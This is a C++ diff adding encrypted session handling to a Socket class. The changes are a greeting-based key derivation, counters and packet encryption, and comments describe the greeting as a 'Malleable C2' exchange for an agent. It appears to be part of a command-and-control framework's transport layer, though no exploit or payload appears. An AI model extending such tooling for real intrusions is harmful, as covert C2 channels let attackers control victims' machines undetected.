@@ -1,5 +1,7 @@
 #include "Socket.hpp"
-#include <utility> // For std::move
+#include "Packet.hpp"
+#include "CryptoContext.hpp"
+#include <utility>
 #include <string>
 #include <optional>
 
@@ -60,29 +62,38 @@ void Socket::close() noexcept {
 Socket::Socket(Socket&& other) noexcept
     : m_socket_fd(other.m_socket_fd),
       m_ip(std::move(other.m_ip)),
-      m_port(other.m_port) 
+      m_port(other.m_port),
+      m_malleable(other.m_malleable),
+      m_send_counter(other.m_send_counter),
+      m_recv_counter(other.m_recv_counter)
 {
-    // We "steal" the resources and nullify the donor's socket file descriptor. 
-    // If we don't nullify 'other.m_socket_fd', its destructor will close the socket!
+    std::memcpy(m_session_key, other.m_session_key, sizeof(m_session_key));
     other.m_socket_fd = INVALID_SOCKET;
     other.m_port = 0;
+    other.m_malleable = false;
+    other.m_send_counter = 0;
+    other.m_recv_counter = 0;
+    std::memset(other.m_session_key, 0, sizeof(other.m_session_key));
 }
 
-// 6. Move Assignment Operator
+// Move Assignment Operator
 Socket& Socket::operator=(Socket&& other) noexcept {
-    if (this != &other) { // Guard against self-assignment: Socket A = std::move(A);
-        
-        // Step 1: Clean up our EXISTING resource before stealing a new one.
-        close(); 
-
-        // Step 2: Steal the donor's resources
+    if (this != &other) {
+        close();
         m_socket_fd = other.m_socket_fd;
         m_ip = std::move(other.m_ip);
         m_port = other.m_port;
+        m_malleable = other.m_malleable;
+        m_send_counter = other.m_send_counter;
+        m_recv_counter = other.m_recv_counter;
+        std::memcpy(m_session_key, other.m_session_key, sizeof(m_session_key));
 
-        // Step 3: Nullify the donor
         other.m_socket_fd = INVALID_SOCKET;
         other.m_port = 0;
+        other.m_malleable = false;
+        other.m_send_counter = 0;
+        other.m_recv_counter = 0;
+        std::memset(other.m_session_key, 0, sizeof(other.m_session_key));
     }
     return *this;
 }
@@ -142,7 +153,7 @@ bool Socket::listen(int backlog) {
     return true; 
 }
 
-bool Socket::connectTo(const std::string& ip, uint16_t port) {
+bool Socket::connectTo(const std::string& ip, uint16_t port, bool expectGreeting) {
     if (m_socket_fd != INVALID_SOCKET) {
         return false;
     }
@@ -166,9 +177,39 @@ bool Socket::connectTo(const std::string& ip, uint16_t port) {
     m_ip = ip;
     m_port = port;
 
-    // Detect dead connections so the agent can reconnect
     setReceiveTimeout(10);
     setKeepAlive(30, 10);
+
+    if (expectGreeting) {
+        // Malleable C2 greeting exchange: read 64 random bytes from server
+        uint8_t greeting[CryptoContext::GREETING_SIZE];
+        size_t total = 0;
+        while (total < sizeof(greeting)) {
+            int recv_len = static_cast<int>(sizeof(greeting) - total);
+            ssize_t n = ::recv(m_socket_fd,
+                               reinterpret_cast<char*>(greeting) + total,
+                               recv_len, 0);
+            if (n <= 0) break;
+            total += static_cast<size_t>(n);
+        }
+        if (total != sizeof(greeting)) {
+            std::fprintf(stderr, "[Socket] Greeting read failed: got %zu of %zu bytes\n",
+                         total, sizeof(greeting));
+            close();
+            return false;
+        }
+
+        auto key = CryptoContext::deriveSessionKey(greeting);
+        if (key.size() != sizeof(m_session_key)) {
+            std::fprintf(stderr, "[Socket] Greeting key derivation failed (%zu bytes)\n",
+                         key.size());
+            close();
+            return false;
+        }
+        setSessionKey(key.data(), key.size());
+        std::fprintf(stdout, "[Socket] Malleable session established (key=%zu bytes)\n",
+                     key.size());
+    }
 
     return true;
 }
@@ -192,6 +233,67 @@ std::optional<Socket> Socket::acceptNode() {
 
 
 // I/O Operations
+
+bool Socket::sendRaw(const uint8_t* data, size_t len) const {
+    if (!isValid()) return false;
+    int send_len = static_cast<int>(len);
+    if (static_cast<size_t>(send_len) != len) return false; // truncation check
+    ssize_t sent = ::send(m_socket_fd,
+                          reinterpret_cast<const char*>(data), send_len, 0);
+    return sent == static_cast<ssize_t>(send_len);
+}
+
+ssize_t Socket::receiveRaw(uint8_t* buf, size_t max_len) const {
+    if (!isValid()) return -1;
+    int recv_len = static_cast<int>(max_len);
+    if (static_cast<size_t>(recv_len) != max_len) return -1;
+    return ::recv(m_socket_fd, reinterpret_cast<char*>(buf), recv_len, 0);
+}
+
+ssize_t Socket::sendPacket(uint16_t opcode, const std::string& payload) {
+    if (!isValid()) return -1;
+    std::vector<uint8_t> data;
+    if (m_malleable) {
+        Packet p(opcode, payload, m_session_key, m_send_counter);
+        data = p.serialize();
+        ++m_send_counter;
+    } else {
+        Packet p(opcode, payload);
+        data = p.serialize();
+    }
+    if (data.empty()) return -1;
+    int send_len = static_cast<int>(data.size());
+    if (static_cast<size_t>(send_len) != data.size()) return -1;
+    return ::send(m_socket_fd,
+                  reinterpret_cast<const char*>(data.data()),
+                  send_len, 0);
+}
+
+std::optional<Packet> Socket::receivePacket(std::vector<uint8_t>& buffer) {
+    if (!isValid()) return std::nullopt;
+    if (m_malleable) {
+        auto result = Packet::deserialize(buffer, m_session_key, m_recv_counter);
+        if (result.has_value()) ++m_recv_counter;
+        return result;
+    }
+    return Packet::deserialize(buffer, nullptr, 0);
+}
+
+void Socket::setSessionKey(const uint8_t* key, size_t len) {
+    if (key == nullptr || len != sizeof(m_session_key)) {
+        std::memset(m_session_key, 0, sizeof(m_session_key));
+        m_malleable = false;
+        m_send_counter = 0;
+        m_recv_counter = 0;
+        return;
+    }
+    std::memcpy(m_session_key, key, sizeof(m_session_key));
+    m_send_counter = 0;
+    m_recv_counter = 0;
+    m_malleable = true;
+}
+
+bool Socket::hasSessionKey() const { return m_malleable; }
 
 ssize_t Socket::sendData(const std::vector<uint8_t>& data) const {
     if (!isValid()) {
